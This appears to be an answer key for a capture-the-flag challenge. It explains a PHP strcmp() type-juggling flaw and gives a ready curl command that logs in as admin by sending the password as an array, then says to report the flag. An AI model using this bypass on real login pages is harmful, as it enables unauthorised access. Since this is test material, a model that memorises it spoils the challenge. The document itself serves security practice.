# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: PHP type-juggling in a `strcmp()` password check. Passing the
password as an array makes `strcmp(array, string)` return NULL, which `== 0`
evaluates true, bypassing the check.

1. **Send the password as an array** (`password[]=x`) with the admin username:

   ```
   curl -s -G "http://<target>/index.php" \
     --data-urlencode "username=admin" --data-urlencode "password[]=x"
   ```

2. **Extract the flag** (`FLAG{...}`) from the response and report it verbatim.
